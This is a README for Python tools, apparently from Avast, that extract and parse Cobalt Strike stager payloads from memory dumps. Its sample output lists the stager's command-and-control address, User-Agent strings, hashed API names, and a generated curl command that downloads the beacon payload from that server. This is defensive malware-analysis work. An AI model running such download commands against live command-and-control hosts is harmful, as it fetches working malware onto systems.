# Payload tools

Python scripts for extracting and parsing x86 and x64 payloads.

## cs_payload_parser.py
Parser support DNS, SMB, TCP Bind/Reverse, HTTP/HTTPS payloads.

Usage:
```
cs_payload_parser.py <file_or_directory>
```
Example:
```
cs_payload_parser.py memdump.bin
cs_payload_parser.py c:\cs_payloads\
```
Output:
```
<filename>.log
```
```
--------------------------------------------------------------------------------
Filename:	fhttps_raw_x86
--------------------------------------------------------------------------------
Architecture:	x86
Payload type:	HTTPS stager
Payload start:	0x0000
Customer ID:   	0x12345678 | 305419896
--------------------------------------------------------------------------------
Request detail:
Address:	192.168.42.2
Port:		444
Query:		/AYhZ (Beacon_x86 checksum)
--------------------------------------------------------------------------------
Request header:
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)
--------------------------------------------------------------------------------
Curl download command:
curl -o beacon_x86.bin -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;PTBR)" https://192.168.42.2:444/AYhZ
--------------------------------------------------------------------------------
Payload API list:
Offset  | Hash value  | API name
0x009c  | 0x0726774c  | kernel32.dll_LoadLibraryA
0x00af  | 0xa779563a  | wininet.dll_InternetOpenA
0x00cb  | 0xc69f8957  | wininet.dll_InternetConnectA
0x00e7  | 0x3b2e55eb  | wininet.dll_HttpOpenRequestA
0x0100  | 0x869e4675  | wininet.dll_InternetSetOptionA
0x0110  | 0x7b18062d  | wininet.dll_HttpSendRequestA
0x0129  | 0x5de2c5aa  | kernel32.dll_GetLastError
0x0132  | 0x315e2145  | user32.dll_GetDesktopWindow
0x0141  | 0x0be057b7  | wininet.dll_InternetErrorDlg
0x02e9  | 0x56a2b5f0  | kernel32.dll_ExitProcess
0x02fd  | 0xe553a458  | kernel32.dll_VirtualAlloc
0x0318  | 0xe2899612  | wininet.dll_InternetReadFile
--------------------------------------------------------------------------------
```

## cs_payload_extractor.py

Payload extractor and parser for various encoded formats (hex, hex_array, hex_veil, dec_array, chr_array, base64, xor, inflate, gzip).

Usage:
```
cs_payload_extractor.py <file_or_directory>
```
Example:
```
cs_payload_extractor.py memdump.bin
cs_payload_extractor.py c:\cs_payloads\
```
Output:
```
<filename>_payload.bin
<filename>_payload.bin.log
```
```
--------------------------------------------------------------------------------
CS Payload extractor v1.00                                  Avast Software s.r.o
--------------------------------------------------------------------------------
[*] Extracting file..
--------------------------------------------------------------------------------
Filename:       fhttps_exe_x86
Payload type:   xored_payload
--------------------------------------------------------------------------------
Saved as:       fhttps_exe_x86_payload.bin
--------------------------------------------------------------------------------
[*] Parsing file..
--------------------------------------------------------------------------------
Filename:       fhttps_exe_x86_payload.bin
--------------------------------------------------------------------------------
Architecture:   x86
Payload type:   HTTPS stager
Payload start:  0x0000
Customer ID:    0x12345678 | 305419896
--------------------------------------------------------------------------------
Request detail:
Address:        192.168.42.2
Port:           444
Query:          /IZVc (Beacon_x86 checksum)
--------------------------------------------------------------------------------
Request header:
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MASP)
--------------------------------------------------------------------------------
Curl download command:
curl -o beacon_x86.bin -H "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MASP)" https://192.168.42.2:444/IZVc
--------------------------------------------------------------------------------
Payload API list:
Offset  | Hash value  | API name
0x009c  | 0x0726774c  | kernel32.dll_LoadLibraryA
0x00af  | 0xa779563a  | wininet.dll_InternetOpenA
0x00cb  | 0xc69f8957  | wininet.dll_InternetConnectA
0x00e7  | 0x3b2e55eb  | wininet.dll_HttpOpenRequestA
0x0100  | 0x869e4675  | wininet.dll_InternetSetOptionA
0x0110  | 0x7b18062d  | wininet.dll_HttpSendRequestA
0x0129  | 0x5de2c5aa  | kernel32.dll_GetLastError
0x0132  | 0x315e2145  | user32.dll_GetDesktopWindow
0x0141  | 0x0be057b7  | wininet.dll_InternetErrorDlg
0x02e9  | 0x56a2b5f0  | kernel32.dll_ExitProcess
0x02fd  | 0xe553a458  | kernel32.dll_VirtualAlloc
0x0318  | 0xe2899612  | wininet.dll_InternetReadFile
--------------------------------------------------------------------------------
```
